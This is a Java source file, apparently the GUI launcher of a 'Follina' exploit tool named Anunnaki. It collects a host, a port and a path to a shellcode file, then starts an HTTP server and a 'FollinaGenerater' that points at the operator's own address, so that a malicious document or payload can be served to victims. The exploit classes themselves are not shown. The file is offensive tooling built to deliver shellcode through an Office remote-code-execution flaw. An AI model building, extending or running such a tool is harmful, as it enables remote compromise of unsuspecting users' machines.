package follina.server;

import java.awt.BorderLayout;
import java.awt.EventQueue;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.File;
import java.net.InetAddress;
import java.net.UnknownHostException;

import javax.swing.JButton;
import javax.swing.JFileChooser;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JTextField;
import javax.swing.filechooser.FileSystemView;

import follina.server.http.ServerHTTP;
import follina.server.services.FollinaGenerater;
import java.awt.Color;

public class Anunnaki {

	// Principal Variable
	public static int PORT = 8080;
	public static String ShellcodePath = "";
	public static String Address = "";
	public static String networkInterface = "";
	public static boolean isRunning = false;

	private JFrame frame;
	private static JTextField shellcode;
	private static JTextField port;
	private static JTextField hostAddress;
	private static JButton btnStart;
	private static JLabel error;
	// Process
	private static ServerHTTP server;
	private static FollinaGenerater generator;

	public static void main(String[] args) {
		EventQueue.invokeLater(new Runnable() {
			public void run() {
				try {
					Anunnaki window = new Anunnaki();
					window.frame.setVisible(true);
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		});
	}

	/**
	 * Create the application.
	 */
	public Anunnaki() {
		initialize();
	}

	/**
	 * Initialize the contents of the frame.
	 */
	private void initialize() {
		frame = new JFrame("Annunaki");
		frame.setBounds(100, 100, 831, 448);
		frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);

		JPanel panel = new JPanel();
		frame.getContentPane().add(panel, BorderLayout.CENTER);
		panel.setLayout(null);

		JLabel lblHost = new JLabel("Host");
		lblHost.setBounds(108, 106, 70, 15);
		panel.add(lblHost);

		JLabel lblPort = new JLabel("Port");
		lblPort.setBounds(108, 156, 70, 15);
		panel.add(lblPort);

		JLabel lblShellcode = new JLabel("Shellcode");
		lblShellcode.setBounds(108, 206, 70, 15);
		panel.add(lblShellcode);

		shellcode = new JTextField();
		shellcode.setBounds(264, 198, 234, 26);
		panel.add(shellcode);
		shellcode.setColumns(10);

		port = new JTextField();
		port.setBounds(264, 151, 234, 26);
		panel.add(port);
		port.setColumns(10);

		hostAddress = new JTextField();
		hostAddress.setBounds(264, 104, 234, 26);
		panel.add(hostAddress);
		hostAddress.setColumns(10);

		JButton browseBtn = new JButton("Browse");
		browseBtn.setBounds(525, 196, 141, 34);
		panel.add(browseBtn);
		browseBtn.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {

				JFileChooser fileChooser = new JFileChooser(FileSystemView.getFileSystemView().getHomeDirectory());
				fileChooser.setFileSelectionMode(JFileChooser.FILES_ONLY);
				int res = fileChooser.showOpenDialog(null);
				if (res == JFileChooser.APPROVE_OPTION) {
					File file = fileChooser.getSelectedFile();
					shellcode.setText(file.getAbsolutePath());
				}
			}
		});

		btnStart = new JButton("Start Server");
		btnStart.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				if (!isRunning) {
					String result = loadData(); // Verify that data are good
					if (result.equals(""))
						startApp();
					else
						error.setText(result);
				} else
					stopApp();
			}
		});
		btnStart.setBounds(264, 243, 234, 63);
		panel.add(btnStart);

		error = new JLabel("");
		error.setBackground(Color.RED);
		error.setBounds(243, 334, 318, 34);
		panel.add(error);
	}

	// Principal functions
	public static void startApp() {
		isRunning = true;
		server = ServerHTTP.getInstance();
		generator = new FollinaGenerater("http://" + Address + ":" + PORT);
		Thread serverTask = new Thread(server);
		Thread generated = new Thread(generator);
		serverTask.start();
		generated.start();
		btnStart.setText("Stop Server");
	}

	public static void stopApp() {
		if (isRunning) {
			isRunning = false;
			ShellcodePath = "";
			PORT = 8080;
			Address = "";
			shellcode.setText("");
			port.setText("");
			hostAddress.setText("");
			generator = null;
			server.destory();
			btnStart.setText("Start Server");
		}

	}

	private String loadData() {
		ShellcodePath = shellcode.getText();
		try {
			PORT = Integer.parseInt(port.getText());
		} catch (NumberFormatException e) {
			return "Port should be numeric";
		}
		Address = hostAddress.getText();
		try {
			InetAddress.getByName(Address);
		} catch (UnknownHostException e) {
			return "Host is invalid";
		}
		return "";
	}
}
